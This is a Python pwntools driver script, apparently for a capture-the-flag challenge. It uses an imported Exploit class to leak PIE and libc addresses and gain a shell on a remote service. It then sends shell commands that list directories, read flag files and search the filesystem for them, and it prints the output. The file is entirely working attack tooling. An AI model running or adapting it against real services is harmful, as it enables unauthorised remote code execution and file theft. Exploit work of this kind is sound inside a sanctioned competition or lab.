#!/usr/bin/env python3
import sys, os, time, struct
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from pwn import context
from exploit_same import Exploit, HOST, PORT
context.log_level = 'error'

def run(cmds, read_time=6.0):
    ex = Exploit(HOST, PORT)
    print("pie=%#x" % ex.pie, flush=True)
    lb = ex.leak_libc()
    ex.finish(lb)
    time.sleep(0.5)
    ex.p.send(cmds)
    data = b""
    t0 = time.time()
    idle = 0
    while time.time()-t0 < read_time:
        try:
            d = ex.p.recv(65536, timeout=1.0)
        except Exception:
            d = b""
        if not d:
            idle += 1
            if idle >= 3:
                break
        else:
            data += d; idle = 0
    ex.p.close()
    return data

if __name__ == "__main__":
    cmds = b"echo PWD=$PWD\nls -la /\nls -la .\ncat /flag\ncat flag\ncat /flag.txt\ncat flag.txt\nfind / -maxdepth 4 -name '*flag*' 2>/dev/null\n"
    if len(sys.argv) > 1 and os.path.exists(sys.argv[1]):
        cmds = open(sys.argv[1], "rb").read()
    out = run(cmds)
    sys.stdout.write(out.decode('latin1'))
    sys.stdout.write("\n----END----\n")
